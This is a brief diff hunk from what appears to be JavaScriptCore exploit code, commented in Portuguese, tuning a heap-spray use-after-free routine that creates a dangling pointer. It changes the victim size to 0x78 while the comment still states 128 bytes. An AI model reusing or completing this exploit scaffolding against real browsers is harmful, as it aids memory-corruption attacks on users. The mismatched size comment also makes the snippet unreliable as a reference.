@@ -243,7 +243,7 @@ async function triggerGC(logFn, pauseFn) {
 // A lógica aqui é a do seu OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF.mjs
 async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     let dangling_ref = null; // Esta será a referência pendurada
-    const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
+    const VICTIM_SIZE_BYTES = 0x78; // Tamanho do objeto vítima para UAF (128 bytes)
 
     // PASSO 1: Criar o objeto vítima que será liberado mas que teremos uma dangling_ref.
     // O tipo de objeto aqui (Float64Array) é crucial para como o ponteiro será lido.
